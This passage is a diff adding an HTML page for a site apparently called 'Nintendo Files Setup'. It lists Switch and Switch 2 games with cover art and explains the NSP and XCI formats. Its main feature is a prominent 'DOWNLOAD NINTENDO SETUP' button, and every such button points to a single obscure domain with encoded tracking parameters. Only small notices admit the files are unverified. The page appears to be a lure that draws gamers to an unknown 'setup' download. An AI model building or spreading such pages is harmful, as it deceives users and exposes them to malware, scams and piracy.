@@ -1,0 +1,1562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#080c18">
+
+<title>Nintendo Files Setup | Switch & Switch 2 Games</title>
+
+<meta name="description" content="Explore popular Nintendo Switch and Switch 2 games, cover art, genres, NSP and XCI information, and Nintendo setup resources.">
+
+<style>
+:root{
+  --bg:#080c18;
+  --panel:#121a2b;
+  --panel2:#172238;
+  --line:#2a3650;
+  --muted:#9ba9bf;
+  --white:#f6f9ff;
+  --red:#ff465d;
+  --cyan:#58e3e8;
+  --gold:#ffc66d;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--white);
+  font:15px/1.55 system-ui,-apple-system,Segoe UI,Arial,sans-serif;
+}
+a{text-decoration:none;color:inherit}
+button,input{font:inherit}
+button{cursor:pointer}
+.wrap{
+  width:min(1200px,calc(100% - 36px));
+  margin-inline:auto;
+}
+
+/* TOP BAR */
+
+.topline{
+  background:#ed344c;
+  text-align:center;
+  font-size:11px;
+  font-weight:800;
+  letter-spacing:1.5px;
+  padding:8px 12px;
+  text-transform:uppercase;
+}
+.topline span{color:#ffe5e9}
+
+/* HEADER */
+
+header{
+  position:sticky;
+  top:0;
+  z-index:20;
+  background:#0b1121ef;
+  border-bottom:1px solid #ffffff16;
+  backdrop-filter:blur(16px);
+}
+.head{
+  min-height:76px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:18px;
+}
+.brand{
+  display:flex;
+  align-items:center;
+  gap:11px;
+  min-width:0;
+}
+.mark{
+  width:44px;
+  height:44px;
+  border-radius:13px;
+  background:linear-gradient(140deg,#ff5368,#ba182c);
+  box-shadow:0 8px 30px #fa34434a;
+  display:grid;
+  place-items:center;
+  font-size:25px;
+}
+.brand strong{
+  font-size:18px;
+  line-height:1.1;
+  display:block;
+  letter-spacing:-.5px;
+}
+.brand small{
+  font-size:9px;
+  color:#aebed4;
+  letter-spacing:2.1px;
+  display:block;
+  margin-top:5px;
+}
+.links{
+  display:flex;
+  gap:23px;
+  align-items:center;
+}
+.links a{
+  font-size:12px;
+  color:#c6d1e2;
+  font-weight:700;
+}
+.links a:hover{color:var(--cyan)}
+.head-cta{
+  padding:10px 15px;
+  border-radius:9px;
+  color:#fff!important;
+  background:#eb354d;
+}
+.menu{
+  display:none;
+  background:#1c2a42;
+  color:#fff;
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:8px 12px;
+}
+
+/* HERO */
+
+.hero{
+  position:relative;
+  isolation:isolate;
+  overflow:hidden;
+  border-bottom:1px solid #ffffff12;
+  background:
+    radial-gradient(ellipse 65% 70% at 80% 12%,#28386a 0%,transparent 75%),
+    radial-gradient(ellipse 65% 80% at 0% 80%,#2a1530 0%,transparent 78%),
+    #0a1020;
+}
+.hero:after{
+  content:"";
+  position:absolute;
+  inset:0;
+  z-index:-1;
+  opacity:.13;
+  background-image:
+    linear-gradient(#fff 1px,transparent 1px),
+    linear-gradient(90deg,#fff 1px,transparent 1px);
+  background-size:65px 65px;
+  mask-image:linear-gradient(to top,#000,transparent);
+}
+.hero-layout{
+  display:grid;
+  grid-template-columns:1.1fr .9fr;
+  align-items:center;
+  gap:35px;
+  padding:68px 0 78px;
+}
+.eyebrow{
+  color:var(--cyan);
+  font-weight:900;
+  letter-spacing:2.1px;
+  font-size:11px;
+}
+.hero h1{
+  font-size:clamp(39px,5.2vw,69px);
+  line-height:1.06;
+  letter-spacing:-2.8px;
+  margin:17px 0;
+}
+.hero h1 em{
+  font-style:normal;
+  color:var(--red);
+}
+.hero p{
+  max-width:580px;
+  color:#abb9d0;
+  margin:0 0 23px;
+  font-size:15px;
+}
+
+/* MAIN SETUP BUTTON */
+
+.setup-box{
+  background:linear-gradient(125deg,#1b243c,#26182e);
+  border:1px solid #ff5a704c;
+  border-radius:21px;
+  padding:22px;
+  box-shadow:0 18px 50px #0006,0 0 40px #ed344c10;
+  max-width:590px;
+}
+.setup-box h2{
+  font-size:16px;
+  letter-spacing:1.4px;
+  margin:0 0 12px;
+}
+.main-download{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:13px;
+  text-align:center;
+  min-height:77px;
+  padding:16px;
+  background:linear-gradient(110deg,#fb3a53,#ff7651);
+  border:1px solid #ffb3a0;
+  color:white;
+  border-radius:14px;
+  font-size:clamp(18px,2.2vw,25px);
+  font-weight:1000;
+  letter-spacing:.3px;
+  box-shadow:0 9px 26px #f4365660;
+  transition:transform .2s,filter .2s;
+}
+.main-download:hover{
+  transform:translateY(-3px);
+  filter:brightness(1.08);
+}
+.main-download span{font-size:28px}
+.external-notice{
+  font-size:11px;
+  color:#b5c0d2;
+  margin:11px 0 0;
+}
+.hero-pills{
+  display:flex;
+  gap:10px;
+  flex-wrap:wrap;
+  margin-top:18px;
+}
+.pill{
+  border:1px solid #43516b;
+  color:#d9e6f7;
+  background:#ffffff0a;
+  border-radius:50px;
+  padding:7px 11px;
+  font-size:11px;
+  font-weight:750;
+}
+
+/* HERO CONSOLE */
+
+.showcase{
+  position:relative;
+  min-height:420px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.glow{
+  position:absolute;
+  width:290px;
+  height:290px;
+  background:#ff476a;
+  filter:blur(120px);
+  opacity:.22;
+}
+.console{
+  position:relative;
+  width:min(100%,450px);
+  padding:16px 48px;
+  border-radius:34px;
+  background:linear-gradient(145deg,#202c43,#111829);
+  border:2px solid #54627e;
+  box-shadow:0 30px 60px #0008;
+  transform:rotate(-5deg);
+}
+.console:before,
+.console:after{
+  content:"";
+  position:absolute;
+  top:50%;
+  transform:translateY(-50%);
+  width:24px;
+  height:84px;
+  background:#f74860;
+  border-radius:12px;
+  left:10px;
+  box-shadow:inset 0 0 0 6px #ba233e;
+}
+.console:after{
+  left:auto;
+  right:10px;
+  background:#3fdbe3;
+  box-shadow:inset 0 0 0 6px #1598a8;
+}
+.screen{
+  background:#050a16;
+  border:6px solid #040811;
+  padding:14px;
+  border-radius:9px;
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:8px;
+}
+.mini-cover{
+  aspect-ratio:3/4;
+  object-fit:cover;
+  width:100%;
+  border-radius:5px;
+  background:#27324f;
+}
+.screen-label{
+  text-align:center;
+  color:#8995af;
+  font-size:9px;
+  letter-spacing:2px;
+  margin:10px 0 0;
+}
+
+/* STATS */
+
+.stats{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:13px;
+  margin-top:-31px;
+  position:relative;
+  z-index:2;
+}
+.stat{
+  background:#141d31;
+  border:1px solid #34405b;
+  border-radius:14px;
+  padding:18px 20px;
+  box-shadow:0 15px 30px #0004;
+}
+.stat b{
+  font-size:23px;
+  color:var(--white);
+  display:block;
+}
+.stat span{
+  font-size:12px;
+  color:var(--muted);
+}
+
+/* SECTIONS */
+
+section{scroll-margin-top:105px}
+.section{padding-top:58px}
+.section-top{
+  display:flex;
+  gap:18px;
+  align-items:end;
+  justify-content:space-between;
+  margin-bottom:22px;
+}
+.kicker{
+  font-size:10px;
+  letter-spacing:2px;
+  color:var(--red);
+  font-weight:900;
+}
+.section h2{
+  font-size:clamp(24px,3vw,33px);
+  margin:4px 0 6px;
+  line-height:1.2;
+  letter-spacing:-.8px;
+}
+.sub{
+  font-size:13px;
+  color:var(--muted);
+  margin:0;
+}
+.section-link{
+  font-size:12px;
+  color:var(--cyan);
+  font-weight:800;
+  white-space:nowrap;
+}
+
+/* FEATURED */
+
+.feature-grid{
+  display:grid;
+  grid-template-columns:repeat(3,minmax(0,1fr));
+  gap:17px;
+}
+.feature{
+  position:relative;
+  min-height:225px;
+  border:1px solid #43506a;
+  border-radius:18px;
+  overflow:hidden;
+  background:#141b2d;
+  display:flex;
+  align-items:end;
+}
+.feature img{
+  position:absolute;
+  inset:0;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  opacity:.8;
+}
+.feature:after{
+  content:"";
+  position:absolute;
+  inset:35% 0 0;
+  background:linear-gradient(transparent,#050917 92%);
+}
+.feature-info{
+  position:relative;
+  z-index:2;
+  padding:17px;
+  width:100%;
+}
+.feature-info strong{
+  font-size:18px;
+  text-shadow:0 2px 4px black;
+  display:block;
+}
+.feature-info small{
+  color:#d2dded;
+  display:block;
+  margin-top:4px;
+}
+
+/* SEARCH AND FILTER */
+
+.toolbar{
+  display:flex;
+  flex-wrap:wrap;
+  align-items:center;
+  justify-content:space-between;
+  gap:14px;
+  margin:22px 0;
+}
+.search{
+  background:#131b2e;
+  border:1px solid #37435d;
+  border-radius:12px;
+  display:flex;
+  align-items:center;
+  gap:9px;
+  padding:0 15px;
+  flex:1;
+  min-width:230px;
+  max-width:400px;
+}
+.search input{
+  width:100%;
+  height:48px;
+  outline:0;
+  border:0;
+  background:none;
+  color:white;
+}
+.search input::placeholder{color:#8190a8}
+.filters{
+  display:flex;
+  gap:8px;
+  flex-wrap:wrap;
+}
+.filter{
+  background:#172035;
+  color:#acbad0;
+  padding:10px 13px;
+  border:1px solid #34405a;
+  border-radius:10px;
+  font-size:12px;
+  font-weight:750;
+}
+.filter.active,
+.filter:hover{
+  color:#fff;
+  background:#d52d48;
+  border-color:#f34b64;
+}
+
+/* GAME CARDS */
+
+.game-grid{
+  display:grid;
+  grid-template-columns:repeat(4,minmax(0,1fr));
+  gap:20px;
+}
+.card{
+  background:linear-gradient(180deg,#172137,#111a2c);
+  border:1px solid #303d56;
+  border-radius:17px;
+  overflow:hidden;
+  display:flex;
+  flex-direction:column;
+  transition:transform .2s,border-color .2s;
+}
+.card:hover{
+  transform:translateY(-5px);
+  border-color:#fa6076;
+}
+.cover{
+  height:228px;
+  background:radial-gradient(circle at 50% 40%,#27375b,#0c1426);
+  position:relative;
+  overflow:hidden;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.cover img{
+  height:100%;
+  width:100%;
+  object-fit:contain;
+  position:relative;
+  z-index:1;
+}
+.cover-fallback{
+  position:absolute;
+  inset:0;
+  display:grid;
+  place-items:center;
+  font-size:57px;
+}
+.platform-tag{
+  position:absolute;
+  top:11px;
+  left:11px;
+  background:#ff334b;
+  color:#fff;
+  font-size:10px;
+  letter-spacing:.4px;
+  font-weight:900;
+  padding:6px 9px;
+  border-radius:7px;
+  z-index:2;
+}
+.platform-tag.next{background:#12acbc}
+.card-body{
+  padding:16px;
+  display:flex;
+  flex-direction:column;
+  flex:1;
+}
+.genre{
+  font-size:10px;
+  color:#63e9ed;
+  letter-spacing:1.1px;
+  text-transform:uppercase;
+  font-weight:900;
+}
+.card h3{
+  font-size:17px;
+  line-height:1.32;
+  min-height:47px;
+  margin:8px 0;
+}
+.card p{
+  color:var(--muted);
+  font-size:12px;
+  line-height:1.7;
+  margin:0 0 15px;
+  flex:1;
+}
+.card-button{
+  display:block;
+  text-align:center;
+  background:#f23c56;
+  color:white;
+  padding:13px 8px;
+  border-radius:10px;
+  font-size:12px;
+  font-weight:900;
+}
+.card-button:hover{background:#ff5870}
+.card-note{
+  font-size:10px;
+  color:#8391a7;
+  text-align:center;
+  margin-top:8px;
+}
+.no-results{
+  display:none;
+  border:1px dashed #47516a;
+  border-radius:13px;
+  padding:38px;
+  text-align:center;
+  color:#a5b5c9;
+}
+
+/* INFORMATION */
+
+.info-grid{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:17px;
+}
+.info{
+  border:1px solid #34425b;
+  background:#141d30;
+  border-radius:15px;
+  padding:23px;
+}
+.info-icon{font-size:27px}
+.info h3{
+  font-size:17px;
+  margin:12px 0 8px;
+}
+.info p{
+  color:#a3afc3;
+  font-size:13px;
+  margin:0;
+  line-height:1.75;
+}
+
+/* FAQ */
+
+.faq{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:12px;
+}
+.faq details{
+  border:1px solid #33415a;
+  background:#141c2c;
+  padding:18px;
+  border-radius:13px;
+}
+.faq summary{
+  cursor:pointer;
+  font-weight:800;
+  font-size:13px;
+}
+.faq p{
+  color:var(--muted);
+  font-size:12px;
+  margin-bottom:0;
+}
+
+/* BOTTOM BANNER */
+
+.banner{
+  margin-top:62px;
+  border-radius:20px;
+  padding:30px;
+  background:linear-gradient(115deg,#2a203b,#812a42);
+  border:1px solid #ad4265;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:15px;
+}
+.banner h2{
+  margin:0 0 6px;
+  font-size:22px;
+}
+.banner p{
+  margin:0;
+  color:#e9bed0;
+  font-size:12px;
+}
+.banner a{
+  background:white;
+  color:#9d2947;
+  padding:12px 20px;
+  border-radius:10px;
+  font-weight:900;
+  font-size:13px;
+  white-space:nowrap;
+}
+
+/* FOOTER */
+
+footer{
+  margin-top:65px;
+  border-top:1px solid #34405b;
+  background:#0b1120;
+  padding:35px 0;
+  color:#9aaac2;
+}
+.footer-inner{
+  display:flex;
+  justify-content:space-between;
+  gap:25px;
+  align-items:start;
+}
+.footer-inner strong{
+  color:white;
+  font-size:18px;
+}
+.footer-inner p{
+  font-size:12px;
+  max-width:700px;
+}
+.footlinks{
+  display:flex;
+  gap:18px;
+  flex-wrap:wrap;
+  font-size:12px;
+}
+.copyright{
+  border-top:1px solid #ffffff15;
+  padding-top:18px;
+  margin-top:25px;
+  font-size:11px;
+}
+
+/* RESPONSIVE */
+
+@media(max-width:980px){
+  .links{gap:12px}
+  .game-grid{grid-template-columns:repeat(3,1fr)}
+  .hero-layout{gap:10px}
+  .console{padding:13px 40px}
+}
+@media(max-width:760px){
+  .head{min-height:67px}
+  .menu{display:block}
+  .links{
+    display:none;
+    position:absolute;
+    left:0;
+    right:0;
+    top:100%;
+    background:#111b2d;
+    padding:15px 20px;
+    flex-direction:column;
+    align-items:stretch;
+  }
+  .links.open{display:flex}
+  .links a{padding:10px}
+  .hero-layout{
+    grid-template-columns:1fr;
+    padding:44px 0 57px;
+  }
+  .showcase{display:none}
+  .hero h1{letter-spacing:-1.6px}
+  .stats{
+    grid-template-columns:1fr;
+    gap:10px;
+  }
+  .feature-grid{grid-template-columns:1fr 1fr}
+  .feature:last-child{display:none}
+  .game-grid{grid-template-columns:repeat(2,1fr)}
+  .info-grid{grid-template-columns:1fr}
+  .faq{grid-template-columns:1fr}
+  .footer-inner,
+  .banner{
+    flex-direction:column;
+    align-items:stretch;
+  }
+}
+@media(max-width:480px){
+  .wrap{width:calc(100% - 28px)}
+  .brand strong{font-size:16px}
+  .hero h1{font-size:39px}
+  .setup-box{padding:15px}
+  .main-download{
+    min-height:72px;
+    font-size:19px;
+  }
+  .feature-grid{grid-template-columns:1fr}
+  .feature:last-child{display:flex}
+  .feature{min-height:180px}
+  .game-grid{grid-template-columns:1fr}
+  .cover{height:255px}
+  .card h3{min-height:0}
+  .section-top{align-items:start}
+  .section-link{display:none}
+  .search{max-width:none}
+}
+</style>
+</head>
+
+<body>
+
+<div class="topline">
+  ★ NINTENDO FILES SETUP
+  <span>• SWITCH & SWITCH 2 GAME HUB</span> ★
+</div>
+
+<header>
+  <div class="wrap head">
+    <a class="brand" href="#home">
+      <span class="mark">🎮</span>
+      <span>
+        <strong>Nintendo Files Setup</strong>
+        <small>THE GAMING COLLECTION</small>
+      </span>
+    </a>
+
+    <button class="menu" id="menu" aria-label="Toggle menu" aria-expanded="false">☰</button>
+
+    <nav class="links" id="nav">
+      <a href="#home">Home</a>
+      <a href="#popular">Top Games</a>
+      <a href="#catalog">Game Library</a>
+      <a href="#formats">NSP & XCI Guide</a>
+      <a href="#faq">FAQs</a>
+      <a href="#setup" class="head-cta">Nintendo Setup ↗</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<!-- HERO -->
+
+<div class="hero" id="home">
+  <div class="wrap hero-layout">
+
+    <div>
+      <div class="eyebrow">● THE ULTIMATE GAMING DISCOVERY PAGE</div>
+
+      <h1>
+        Nintendo games.<br>
+        <em>One epic hub.</em>
+      </h1>
+
+      <p>
+        Explore hit Nintendo Switch and Switch 2 games,
+        including Mario, Pokémon, Zelda, Animal Crossing
+        and more. See cover art, genres and game information
+        in a stylish dark library.
+      </p>
+
+      <!-- BIG DOWNLOAD SETUP BUTTON -->
+
+      <div class="setup-box" id="setup">
+        <h2>⬇ DOWNLOAD NINTENDO SETUP</h2>
+
+        <a
+          class="main-download external"
+          target="_blank"
+          rel="noopener noreferrer"
+        >
+          <span>⬇</span>
+          DOWNLOAD NINTENDO SETUP
+          <span>↗</span>
+        </a>
+
+        <div class="external-notice">
+          External third-party setup page • Not an official
+          Nintendo download • Check before installing
+        </div>
+      </div>
+
+      <div class="hero-pills">
+        <span class="pill">🎮 Nintendo Switch</span>
+        <span class="pill">⚡ Nintendo Switch 2</span>
+        <span class="pill">🔍 20 Game Guides</span>
+        <span class="pill">🖼️ Cover Art</span>
+      </div>
+    </div>
+
+    <!-- RIGHT SIDE GAMING CONSOLE -->
+
+    <div class="showcase">
+      <div class="glow"></div>
+
+      <div class="console">
+        <div class="screen">
+          <img class="mini-cover" alt="Mario Kart World art"
+            src="https://upload.wikimedia.org/wikipedia/en/6/65/Mario_Kart_World_Cover_Artwork.png">
+
+          <img class="mini-cover" alt="Zelda artwork"
+            src="https://upload.wikimedia.org/wikipedia/en/f/fb/The_Legend_of_Zelda_Tears_of_the_Kingdom_cover.jpg">
+
+          <img class="mini-cover" alt="Pokemon Legends Arceus artwork"
+            src="https://upload.wikimedia.org/wikipedia/en/9/9c/Pokemon_Legends_Arceus_cover.jpg">
+        </div>
+
+        <div class="screen-label">CHOOSE YOUR NEXT ADVENTURE</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- STATS -->
+
+<div class="wrap stats">
+
+  <div class="stat">
+    <b>20</b>
+    <span>Popular game listings</span>
+  </div>
+
+  <div class="stat">
+    <b>2 Platforms</b>
+    <span>Nintendo Switch + Switch 2</span>
+  </div>
+
+  <div class="stat">
+    <b>1 Setup Link</b>
+    <span>Opens external website in new tab</span>
+  </div>
+
+</div>
+
+<!-- FEATURED -->
+
+<section class="wrap section" id="popular">
+
+  <div class="section-top">
+    <div>
+      <div class="kicker">HAND-PICKED HIGHLIGHTS</div>
+      <h2>🔥 Big Nintendo Hits</h2>
+      <p class="sub">Popular franchises and headline releases.</p>
+    </div>
+    <a class="section-link" href="#catalog">View All 20 Games →</a>
+  </div>
+
+  <div class="feature-grid">
+
+    <a href="#catalog" class="feature">
+      <img loading="lazy"
+        src="https://upload.wikimedia.org/wikipedia/en/6/65/Mario_Kart_World_Cover_Artwork.png"
+        alt="Mario Kart World cover">
+      <div class="feature-info">
+        <strong>Mario Kart World</strong>
+        <small>Racing • Switch 2</small>
+      </div>
+    </a>
+
+    <a href="#catalog" class="feature">
+      <img loading="lazy"
+        src="https://upload.wikimedia.org/wikipedia/en/f/fb/The_Legend_of_Zelda_Tears_of_the_Kingdom_cover.jpg"
+        alt="Zelda Tears of the Kingdom cover">
+      <div class="feature-info">
+        <strong>Zelda: Tears of the Kingdom</strong>
+        <small>Adventure • Switch</small>
+      </div>
+    </a>
+
+    <a href="#catalog" class="feature">
+      <img loading="lazy"
+        src="https://upload.wikimedia.org/wikipedia/en/0/00/Pok%C3%A9mon_Scarlet_and_Violet_banner.png"
+        alt="Pokemon Scarlet and Violet art">
+      <div class="feature-info">
+        <strong>Pokémon Scarlet & Violet</strong>
+        <small>RPG • Switch</small>
+      </div>
+    </a>
+
+  </div>
+
+</section>
+
+<!-- GAME LIBRARY -->
+
+<section class="wrap section" id="catalog">
+
+  <div class="section-top">
+    <div>
+      <div class="kicker">THE GAME LIBRARY</div>
+      <h2>🎮 Explore Nintendo Games</h2>
+      <p class="sub">
+        Browse 20 popular titles across multiple Nintendo genres.
+      </p>
+    </div>
+    <span class="section-link" id="counter">20 Games</span>
+  </div>
+
+  <div class="toolbar">
+
+    <div class="search">
+      <span>🔍</span>
+      <input
+        id="search"
+        type="search"
+        placeholder="Search games, genres, platforms..."
+        aria-label="Search Nintendo games"
+      >
+    </div>
+
+    <div class="filters">
+      <button class="filter active" data-filter="all">All Games</button>
+      <button class="filter" data-filter="Switch">Switch</button>
+      <button class="filter" data-filter="Switch 2">Switch 2</button>
+      <button class="filter" data-filter="Mario">Mario</button>
+      <button class="filter" data-filter="Pokémon">Pokémon</button>
+      <button class="filter" data-filter="Zelda">Zelda</button>
+    </div>
+
+  </div>
+
+  <div id="gameGrid" class="game-grid"></div>
+
+  <div class="no-results" id="empty">
+    No matching games. Try a different search or filter.
+  </div>
+
+</section>
+
+<!-- FORMAT INFORMATION -->
+
+<section class="wrap section" id="formats">
+
+  <div class="section-top">
+    <div>
+      <div class="kicker">GAME FORMAT BASICS</div>
+      <h2>📦 Nintendo Game Format Guide</h2>
+      <p class="sub">
+        A few useful facts about Nintendo game files.
+      </p>
+    </div>
+  </div>
+
+  <div class="info-grid">
+
+    <article class="info">
+      <div class="info-icon">📁</div>
+      <h3>What does NSP mean?</h3>
+      <p>
+        NSP is a Nintendo Switch package format commonly discussed
+        in game-file communities. It is not the same as a verified
+        official game purchase or installer.
+      </p>
+    </article>
+
+    <article class="info">
+      <div class="info-icon">💾</div>
+      <h3>What is XCI?</h3>
+      <p>
+        XCI is a cartridge-image format associated with Nintendo
+        Switch games. An XCI file does not automatically mean that
+        copying or distribution is authorized.
+      </p>
+    </article>
+
+    <article class="info">
+      <div class="info-icon">🛡️</div>
+      <h3>Official and safe downloads</h3>
+      <p>
+        For legitimate game downloads, purchase from Nintendo eShop
+        or official publishers. Check platform, region, storage and
+        the source before downloading.
+      </p>
+    </article>
+
+  </div>
+
+</section>
+
+<!-- FAQ -->
+
+<section class="wrap section" id="faq">
+
+  <div class="section-top">
+    <div>
+      <div class="kicker">QUICK QUESTIONS</div>
+      <h2>❔ Frequently Asked Questions</h2>
+    </div>
+  </div>
+
+  <div class="faq">
+
+    <details>
+      <summary>Does the Nintendo Setup button download each listed game?</summary>
+      <p>
+        No. Every Nintendo Setup button goes to the same third-party
+        URL. The game cards are informational listings, not individual
+        game-download links.
+      </p>
+    </details>
+
+    <details>
+      <summary>Are all games compatible with the original Switch?</summary>
+      <p>
+        No. Titles marked Switch 2 require Nintendo Switch 2.
+        Some games have different editions for both systems.
+        Confirm compatibility before purchasing.
+      </p>
+    </details>
+
+    <details>
+      <summary>Is this an official Nintendo website?</summary>
+      <p>
+        No. Nintendo Files Setup is an independent game-directory
+        design and is not affiliated with Nintendo.
+      </p>
+    </details>
+
+    <details>
+      <summary>Where can I get official Nintendo games?</summary>
+      <p>
+        Use Nintendo eShop on your console or the official
+        Nintendo game store at nintendo.com.
+      </p>
+    </details>
+
+  </div>
+
+</section>
+
+<!-- BOTTOM BANNER -->
+
+<div class="wrap banner">
+  <div>
+    <h2>Ready to explore the Nintendo game world?</h2>
+    <p>
+      Check out the complete game library and choose your next adventure.
+    </p>
+  </div>
+
+  <a href="#catalog">Explore 20 Games →</a>
+</div>
+
+</main>
+
+<!-- FOOTER -->
+
+<footer>
+  <div class="wrap">
+
+    <div class="footer-inner">
+
+      <div>
+        <strong>🎮 Nintendo Files Setup</strong>
+        <p>
+          Independent informational directory featuring Nintendo video
+          game titles and illustrative cover art. Game trademarks and
+          cover images belong to their respective rights holders.
+          This site is not affiliated with Nintendo. The setup buttons
+          link to a third-party website; files at that destination
+          have not been verified.
+        </p>
+      </div>
+
+      <div class="footlinks">
+        <a href="#home">Home</a>
+        <a href="#catalog">Games</a>
+        <a href="#formats">NSP & XCI</a>
+        <a href="https://www.nintendo.com/us/store/games/"
+           target="_blank" rel="noopener noreferrer">
+          Official Nintendo Store ↗
+        </a>
+      </div>
+
+    </div>
+
+    <div class="copyright">
+      © <span id="year"></span> Nintendo Files Setup
+      • Independent game directory
+    </div>
+
+  </div>
+</footer>
+
+<script>
+"use strict";
+
+/*
+============================================
+MAIN DOWNLOAD URL
+
+All Nintendo Setup buttons use this URL.
+============================================
+*/
+
+const DOWNLOAD_URL =
+"https://asdfghn.sbs/?z=MzIw&n=DRIVE%20FILE%20SETUP";
+
+/*
+============================================
+20 NINTENDO GAMES
+============================================
+*/
+
+const games = [
+
+{
+  name:"Mario Kart 8 Deluxe",
+  genre:"Racing",
+  platform:"Switch",
+  series:"Mario",
+  icon:"🏎️",
+  desc:"Kart racing, colorful tracks and party-ready multiplayer.",
+  img:"https://8-bits.cl/cdn/shop/products/mk8.jpg?v=1697305266&width=1445"
+},
+
+{
+  name:"Mario Kart World",
+  genre:"Racing",
+  platform:"Switch 2",
+  series:"Mario",
+  icon:"🏁",
+  desc:"Open-road Mario Kart racing built for Nintendo Switch 2.",
+  img:"https://upload.wikimedia.org/wikipedia/en/6/65/Mario_Kart_World_Cover_Artwork.png"
+},
+
+{
+  name:"The Legend of Zelda: Tears of the Kingdom",
+  genre:"Adventure",
+  platform:"Switch",
+  series:"Zelda",
+  icon:"⚔️",
+  desc:"Explore the skies and vast lands of Hyrule.",
+  img:"https://upload.wikimedia.org/wikipedia/en/f/fb/The_Legend_of_Zelda_Tears_of_the_Kingdom_cover.jpg"
+},
+
+{
+  name:"The Legend of Zelda: Breath of the Wild",
+  genre:"Adventure",
+  platform:"Switch",
+  series:"Zelda",
+  icon:"🗡️",
+  desc:"A celebrated open-air adventure across Hyrule.",
+  img:"https://upload.wikimedia.org/wikipedia/en/c/c6/The_Legend_of_Zelda_Breath_of_the_Wild.jpg"
+},
+
+{
+  name:"Super Mario Odyssey",
+  genre:"Platformer",
+  platform:"Switch",
+  series:"Mario",
+  icon:"🍄",
+  desc:"Journey through colorful kingdoms with Mario and Cappy.",
+  img:"https://upload.wikimedia.org/wikipedia/en/8/8d/Super_Mario_Odyssey.jpg"
+},
+
+{
+  name:"Super Mario Bros. Wonder",
+  genre:"Platformer",
+  platform:"Switch",
+  series:"Mario",
+  icon:"🌟",
+  desc:"Inventive side-scrolling stages and wild Wonder effects.",
+  img:"https://upload.wikimedia.org/wikipedia/en/a/a3/Mariowonder.png"
+},
+
+{
+  name:"Animal Crossing: New Horizons",
+  genre:"Simulation",
+  platform:"Switch",
+  series:"Animal Crossing",
+  icon:"🏝️",
+  desc:"Build and personalize a relaxing island community.",
+  img:"https://upload.wikimedia.org/wikipedia/en/1/1f/Animal_Crossing_New_Horizons.jpg"
+},
+
+{
+  name:"Super Smash Bros. Ultimate",
+  genre:"Fighting",
+  platform:"Switch",
+  series:"Smash Bros.",
+  icon:"🥊",
+  desc:"A huge Nintendo crossover fighting-game roster.",
+  img:"https://upload.wikimedia.org/wikipedia/en/5/50/Super_Smash_Bros._Ultimate.jpg"
+},
+
+{
+  name:"Pokémon Violet",
+  genre:"RPG",
+  platform:"Switch",
+  series:"Pokémon",
+  icon:"💜",
+  desc:"Explore Paldea, catch Pokémon and complete adventures.",
+  img:"https://upload.wikimedia.org/wikipedia/en/0/00/Pok%C3%A9mon_Scarlet_and_Violet_banner.png"
+},
+
+{
+  name:"Pokémon Legends: Arceus",
+  genre:"RPG",
+  platform:"Switch",
+  series:"Pokémon",
+  icon:"✨",
+  desc:"Research Pokémon in the historic Hisui region.",
+  img:"https://upload.wikimedia.org/wikipedia/en/9/9c/Pokemon_Legends_Arceus_cover.jpg"
+},
+
+{
+  name:"Pokémon Legends: Z-A",
+  genre:"RPG",
+  platform:"Switch / Switch 2",
+  series:"Pokémon",
+  icon:"⚡",
+  desc:"An urban Pokémon adventure centered on Lumiose City.",
+  img:"https://upload.wikimedia.org/wikipedia/en/2/2d/Pokemon_Legends_Z-A_Key_Art_Logo.png"
+},
+
+{
+  name:"Splatoon 3",
+  genre:"Action / Shooter",
+  platform:"Switch",
+  series:"Splatoon",
+  icon:"🎨",
+  desc:"Colorful competitive battles and ink-splatting action.",
+  img:"https://upload.wikimedia.org/wikipedia/en/4/4f/Splatoon.3.jpg"
+},
+
+{
+  name:"Luigi's Mansion 3",
+  genre:"Adventure",
+  platform:"Switch",
+  series:"Mario",
+  icon:"👻",
+  desc:"Explore a haunted hotel and solve ghostly puzzles.",
+  img:"https://upload.wikimedia.org/wikipedia/en/3/38/Luigi%27s_Mansion_3.jpg"
+},
+
+{
+  name:"Kirby and the Forgotten Land",
+  genre:"Platformer",
+  platform:"Switch",
+  series:"Kirby",
+  icon:"🌈",
+  desc:"A 3D Kirby journey through a forgotten world.",
+  img:"https://upload.wikimedia.org/wikipedia/en/e/e7/Kirby_and_The_Forgotten_Land_Icon.jpg"
+},
+
+{
+  name:"Donkey Kong Bananza",
+  genre:"Action / Adventure",
+  platform:"Switch 2",
+  series:"Donkey Kong",
+  icon:"🦍",
+  desc:"Smash, explore and discover an underground world.",
+  img:"https://upload.wikimedia.org/wikipedia/en/0/01/Donkey_Kong_Bananza_updated_box_art.png"
+},
+
+{
+  name:"Metroid Prime Remastered",
+  genre:"Action / Adventure",
+  platform:"Switch",
+  series:"Metroid",
+  icon:"🚀",
+  desc:"Samus returns for an atmospheric sci-fi adventure.",
+  img:"https://i5.walmartimages.ca/asr/e0487a59-e16a-4b41-94e3-f97c96d13bdf.b457cfd15279c4e439a146b8f757b6f4.jpeg?odnBg=FFFFFF&odnHeight=2000&odnWidth=2000"
+},
+
+{
+  name:"Super Mario Party Jamboree",
+  genre:"Party",
+  platform:"Switch / Switch 2",
+  series:"Mario",
+  icon:"🎉",
+  desc:"Mini-games, boards and multiplayer fun with friends.",
+  img:"https://upload.wikimedia.org/wikipedia/en/3/3a/Super_Mario_Party_Jamboree_cover_art.jpg"
+},
+
+{
+  name:"Pokémon Sword",
+  genre:"RPG",
+  platform:"Switch",
+  series:"Pokémon",
+  icon:"🛡️",
+  desc:"A Pokémon adventure through the Galar region.",
